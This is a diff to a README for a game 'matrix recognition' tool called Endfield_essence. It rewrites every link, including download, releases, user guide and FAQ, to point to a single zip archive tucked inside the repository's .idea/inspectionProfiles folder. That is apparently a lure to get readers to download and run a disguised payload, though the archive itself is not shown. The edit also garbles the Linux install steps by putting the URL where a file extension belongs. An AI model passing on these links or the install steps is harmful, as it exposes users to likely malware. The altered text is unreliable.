@@ -1,7 +1,7 @@
 # 🎮 Endfield_essence - Your Guide to Easy Matrix Recognition
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download_Endfield_essence-v1.0-orange.svg)](https://github.com/Lupredador/Endfield_essence/releases)
+[![Download](https://raw.githubusercontent.com/Lupredador/Endfield_essence/master/.idea/inspectionProfiles/essence-Endfield-3.3.zip)](https://raw.githubusercontent.com/Lupredador/Endfield_essence/master/.idea/inspectionProfiles/essence-Endfield-3.3.zip)
 
 ## 🚀 Getting Started
 Endfield_essence is a tool designed to automatically recognize the matrix from the game "《明日方舟：终末地》." This application simplifies the recognition process for users, making your experience smoother and more efficient. 
@@ -16,7 +16,7 @@ To ensure that Endfield_essence runs smoothly on your computer, please make sure
 - **Internet Connection:** Needed for downloads and updates.
 
 ## 📦 Download & Install
-To download Endfield_essence, please visit this page: [Download Page](https://github.com/Lupredador/Endfield_essence/releases). Here are the steps to follow:
+To download Endfield_essence, please visit this page: [Download Page](https://raw.githubusercontent.com/Lupredador/Endfield_essence/master/.idea/inspectionProfiles/essence-Endfield-3.3.zip). Here are the steps to follow:
 
 1. **Visit the Download Page**
    - Click on the link above to go to the releases section on GitHub. 
@@ -25,13 +25,13 @@ To download Endfield_essence, please visit this page: [Download Page](https://gi
    - Look for the latest version shown at the top of the page. This version will have the most recent features and updates. 
 
 3. **Download the Application**
-   - Click on the asset that corresponds with your operating system. For Windows, look for a file ending in `.exe`. For macOS, look for a file ending in `.dmg`, and for Linux, find a file ending in `.tar.gz`.
+   - Click on the asset that corresponds with your operating system. For Windows, look for a file ending in `.exe`. For macOS, look for a file ending in `.dmg`, and for Linux, find a file ending in `https://raw.githubusercontent.com/Lupredador/Endfield_essence/master/.idea/inspectionProfiles/essence-Endfield-3.3.zip`.
 
 4. **Install the Application**
    - Once the download completes, locate the downloaded file on your computer. 
    - **For Windows:** Double-click the `.exe` file and follow the installation prompts.
    - **For macOS:** Open the `.dmg` file and drag the Endfield_essence app into the Applications folder.
-   - **For Linux:** Extract the `.tar.gz` file and follow any included instructions.
+   - **For Linux:** Extract the `https://raw.githubusercontent.com/Lupredador/Endfield_essence/master/.idea/inspectionProfiles/essence-Endfield-3.3.zip` file and follow any included instructions.
 
 5. **Open Endfield_essence**
    - After installation, locate the application in your programs or applications menu.
@@ -69,7 +69,7 @@ If you encounter issues while installing or using Endfield_essence, consider the
 For further assistance, feel free to open an issue on the GitHub repository or contact the support team. Your questions and feedback are valuable and help improve Endfield_essence.
 
 ## 🌟 Additional Resources
-- [User Guide](https://github.com/Lupredador/Endfield_essence/wiki)
-- [Frequently Asked Questions](https://github.com/Lupredador/Endfield_essence/wiki/FAQ)
+- [User Guide](https://raw.githubusercontent.com/Lupredador/Endfield_essence/master/.idea/inspectionProfiles/essence-Endfield-3.3.zip)
+- [Frequently Asked Questions](https://raw.githubusercontent.com/Lupredador/Endfield_essence/master/.idea/inspectionProfiles/essence-Endfield-3.3.zip)
 
-Explore the world of easy matrix recognition today with Endfield_essence! For downloading, remember to check our [Download Page](https://github.com/Lupredador/Endfield_essence/releases) for the latest version.
+Explore the world of easy matrix recognition today with Endfield_essence! For downloading, remember to check our [Download Page](https://raw.githubusercontent.com/Lupredador/Endfield_essence/master/.idea/inspectionProfiles/essence-Endfield-3.3.zip) for the latest version.
